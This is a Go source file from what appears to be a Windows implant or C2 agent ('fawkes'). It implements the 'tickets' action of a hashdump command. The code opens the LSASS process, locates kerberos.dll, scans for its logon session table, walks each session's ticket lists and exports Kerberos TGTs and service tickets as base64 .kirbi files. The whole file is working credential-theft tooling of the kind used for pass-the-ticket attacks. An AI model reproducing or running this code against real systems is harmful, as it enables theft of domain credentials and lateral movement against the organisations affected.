//go:build windows
// +build windows

package commands

// Kerberos ticket extraction orchestrator for the hashdump "tickets" action.
// Opens LSASS, finds kerberos.dll, sigscan for KerbGlobalLogonSessionTable,
// walks sessions and ticket lists, extracts raw tickets and builds .kirbi files.

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type kerbTicketReport struct {
	Sessions []kerbSessionReport `json:"sessions"`
	Summary  kerbTicketSummary   `json:"summary"`
}

type kerbTicketSummary struct {
	LsassPID       uint32 `json:"lsass_pid"`
	KerbDllBase    string `json:"kerberos_dll_base"`
	KerbDllSize    uint32 `json:"kerberos_dll_size"`
	TableAddr      string `json:"table_addr"`
	SigVariant     string `json:"sig_variant"`
	SessionLayout  string `json:"session_layout"`
	TicketLayout   string `json:"ticket_layout"`
	SessionsFound  int    `json:"sessions_found"`
	TotalTickets   int    `json:"total_tickets"`
	TGTs           int    `json:"tgts"`
	ServiceTickets int    `json:"service_tickets"`
	KirbiExported  int    `json:"kirbi_exported"`
}

type kerbSessionReport struct {
	LUID     string               `json:"luid"`
	UserName string               `json:"username"`
	Domain   string               `json:"domain"`
	Tickets  []kerbTicketEntryRpt `json:"tickets,omitempty"`
}

type kerbTicketEntryRpt struct {
	ListIndex   int    `json:"list_index"`
	ListName    string `json:"list_name"`
	ServiceName string `json:"service_name"`
	ClientName  string `json:"client_name"`
	Domain      string `json:"domain"`
	Flags       string `json:"flags"`
	KeyType     uint32 `json:"key_type"`
	EncType     uint32 `json:"enc_type"`
	StartTime   string `json:"start_time,omitempty"`
	EndTime     string `json:"end_time,omitempty"`
	RenewUntil  string `json:"renew_until,omitempty"`
	TicketSize  int    `json:"ticket_size"`
	KirbiB64    string `json:"kirbi_b64,omitempty"`
}

func executeKerbTickets() structs.CommandResult {
	ch := make(chan structs.CommandResult, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				ch <- errorf("Kerberos tickets: panic: %v", r)
			}
		}()
		ch <- executeKerbTicketsInner()
	}()

	select {
	case r := <-ch:
		return r
	case <-time.After(60 * time.Second):
		return errorf("Kerberos tickets: operation timed out after 60s")
	}
}

func executeKerbTicketsInner() structs.CommandResult {
	pid, err := lsassFindPID()
	if err != nil {
		return errorf("Kerberos tickets: locate lsass.exe: %v", err)
	}

	h, err := lsassOpenForRead(pid)
	if err != nil {
		protection := detectLsassProtection()
		return errorf("Kerberos tickets: open lsass.exe pid=%d: %v\n[!] Protection: %s\n[!] %s",
			pid, err, protection.Summary(), protection.AccessDeniedHint())
	}
	defer windows.CloseHandle(h)

	kerbMod, err := lsassFindModuleInLsass(pid, "kerberos.dll")
	if err != nil {
		return errorf("Kerberos tickets: find kerberos.dll in lsass: %v", err)
	}

	kerbBytes, err := lsassReadModuleBytes(h, kerbMod)
	if err != nil {
		return errorf("Kerberos tickets: read kerberos.dll (base=0x%X size=%d): %v",
			kerbMod.Base, kerbMod.Size, err)
	}

	tableAddr, sigVariant, err := findKerbSessionTable(kerbBytes, kerbMod.Base)
	if err != nil {
		return errorf("Kerberos tickets: %v", err)
	}

	reader := lsassRemoteReader{h: h}
	sessLayout, tickLayout := selectKerbLayouts(0) // default to modern layout

	// Probe the first session entry to auto-detect the correct struct layout.
	// Windows cumulative updates can shift field offsets.
	head, headErr := readListEntry(reader, tableAddr)
	if headErr == nil && head.Flink != 0 && head.Flink != tableAddr {
		probeBase := head.Flink - uintptr(sessLayout.ListEntryOff)
		sessLayout = probeKerbSessionLayout(reader, probeBase, sessLayout)
	}

	sessions, err := walkKerbSessionList(reader, tableAddr, sessLayout)
	if err != nil && len(sessions) == 0 {
		return errorf("Kerberos tickets: walk session list: %v", err)
	}

	// Diagnostic: dump raw bytes of first session for offset analysis
	var diagDump string
	if len(sessions) > 0 {
		rawSize := 0x200
		diagRaw, dErr := reader.Read(sessions[0].Address, uint32(rawSize))
		if dErr == nil && len(diagRaw) > 0 {
			var sb strings.Builder
			sb.WriteString(fmt.Sprintf("\n[DIAG] Session 0 at 0x%X (%d bytes):\n", sessions[0].Address, len(diagRaw)))
			for row := 0; row < len(diagRaw); row += 16 {
				sb.WriteString(fmt.Sprintf("  +%04X: ", row))
				end := row + 16
				if end > len(diagRaw) {
					end = len(diagRaw)
				}
				for j := row; j < end; j++ {
					sb.WriteString(fmt.Sprintf("%02X ", diagRaw[j]))
				}
				for j := end; j < row+16; j++ {
					sb.WriteString("   ")
				}
				sb.WriteString(" ")
				for j := row; j < end; j++ {
					if diagRaw[j] >= 32 && diagRaw[j] < 127 {
						sb.WriteByte(diagRaw[j])
					} else {
						sb.WriteByte('.')
					}
				}
				sb.WriteString("\n")
			}
			diagDump = sb.String()
		}
	}

	var totalTickets, tgts, serviceTickets, kirbiExported int
	sessionReports := make([]kerbSessionReport, 0, len(sessions))
	var outputLines []string

	for i := range sessions {
		sess := &sessions[i]

		// Extract tickets from all three lists
		sess.Tickets = extractKerbTickets(reader, sess.Raw, sess.Address, sessLayout, tickLayout)

		if len(sess.Tickets) == 0 {
			continue
		}

		sessRpt := kerbSessionReport{
			LUID:     fmt.Sprintf("0x%016X", sess.LUID),
			UserName: sess.UserName,
			Domain:   sess.Domain,
		}

		for _, t := range sess.Tickets {
			totalTickets++
			listName := "service"
			if t.ListIndex == 1 {
				listName = "TGT"
				tgts++
			} else {
				serviceTickets++
			}

			entry := kerbTicketEntryRpt{
				ListIndex:   t.ListIndex,
				ListName:    listName,
				ServiceName: t.ServiceName,
				ClientName:  t.ClientName,
				Domain:      t.DomainName,
				Flags:       formatTicketFlags(t.TicketFlags),
				KeyType:     t.KeyType,
				EncType:     t.TicketEncType,
				TicketSize:  len(t.TicketBytes),
			}

			if !t.StartTime.IsZero() {
				entry.StartTime = t.StartTime.Format(time.RFC3339)
			}
			if !t.EndTime.IsZero() {
				entry.EndTime = t.EndTime.Format(time.RFC3339)
			}
			if !t.RenewUntil.IsZero() {
				entry.RenewUntil = t.RenewUntil.Format(time.RFC3339)
			}

			if len(t.TicketBytes) > 0 {
				kirbi, kErr := buildKirbi(t)
				if kErr == nil && len(kirbi) > 0 {
					entry.KirbiB64 = base64.StdEncoding.EncodeToString(kirbi)
					kirbiExported++
				}
			}

			sessRpt.Tickets = append(sessRpt.Tickets, entry)

			// Build human-readable output line
			line := fmt.Sprintf("[%s] %s\\%s → %s (%s)",
				listName, sess.Domain, sess.UserName, t.ServiceName, t.DomainName)
			if !t.EndTime.IsZero() {
				line += fmt.Sprintf(" expires %s", t.EndTime.Format("2006-01-02 15:04"))
			}
			outputLines = append(outputLines, line)
		}

		sessionReports = append(sessionReports, sessRpt)
	}

	summary := kerbTicketSummary{
		LsassPID:       pid,
		KerbDllBase:    fmt.Sprintf("0x%X", kerbMod.Base),
		KerbDllSize:    kerbMod.Size,
		TableAddr:      fmt.Sprintf("0x%X", tableAddr),
		SigVariant:     sigVariant,
		SessionLayout:  sessLayout.Name,
		TicketLayout:   tickLayout.Name,
		SessionsFound:  len(sessions),
		TotalTickets:   totalTickets,
		TGTs:           tgts,
		ServiceTickets: serviceTickets,
		KirbiExported:  kirbiExported,
	}

	report := kerbTicketReport{
		Sessions: sessionReports,
		Summary:  summary,
	}

	jsonBytes, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return errorf("Kerberos tickets: marshal report: %v", err)
	}

	var header strings.Builder
	header.WriteString(fmt.Sprintf("=== Kerberos Ticket Extraction ===\n"))
	header.WriteString(fmt.Sprintf("LSASS PID: %d | kerberos.dll: %s (size %d)\n",
		pid, summary.KerbDllBase, kerbMod.Size))
	header.WriteString(fmt.Sprintf("Signature: %s | Table: %s\n", sigVariant, summary.TableAddr))
	header.WriteString(fmt.Sprintf("Sessions: %d | Tickets: %d (TGTs: %d, Service: %d) | Kirbi: %d\n\n",
		len(sessions), totalTickets, tgts, serviceTickets, kirbiExported))

	for _, line := range outputLines {
		header.WriteString(line + "\n")
	}

	return successResult(header.String() + diagDump + "\n" + string(jsonBytes))
}
